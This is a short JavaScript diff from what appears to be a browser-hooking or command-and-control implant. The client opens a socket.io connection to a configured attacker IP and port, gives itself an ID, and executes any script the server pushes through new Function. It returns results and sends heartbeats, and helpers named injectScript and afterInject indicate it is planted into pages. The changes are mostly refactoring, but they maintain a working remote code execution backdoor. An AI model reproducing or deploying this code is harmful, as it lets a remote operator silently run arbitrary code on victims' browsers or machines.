@@ -16,13 +16,13 @@ function injectScript(src, url, callback) {
 
 function uuid() {
   return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
-    s4() + '-' + s4() + s4() + s4();
+  s4() + '-' + s4() + s4() + s4();
 }
 
 function s4() {
   return Math.floor((1 + Math.random()) * 0x10000)
-    .toString(16)
-    .substring(1);
+  .toString(16)
+  .substring(1);
 }
 
 (function() {
@@ -41,9 +41,11 @@ function s4() {
 
 function dviide() {
   var date = Date();
-  this.heartbeatid = setInterval(this.heartbeat, 1000);
   this.socket = io(config.ip + ':' + config.ioport);
   this.id = uuid();
+  this.ip = config.ip;
+  this.ioport = config.ioport;
+  this.webport = config.webport;
   this.socket.emit("conn", {id: this.id});
   this.socket.on("command", function(data) {
     var Module = new Function(data.script);
@@ -54,12 +56,15 @@ function dviide() {
     clearInterval(this.heartbeatid);
     this.socket.close();
   }
-  this.callback = function(data) {
+  this.callbackText = function(data) {
     this.socket.emit("callback", {id: this.id, data: data + "\n"});
   }
   this.heartbeat = function() {
-    this.socket.emit("beat", {id: this.id});
+    if(dviide.socket.connected) {
+      dviide.socket.emit("beat", {id: dviide.id});
+    }
   }
+  this.heartbeatid = setInterval(this.heartbeat, 1000);
 }
 
 function afterInject() {
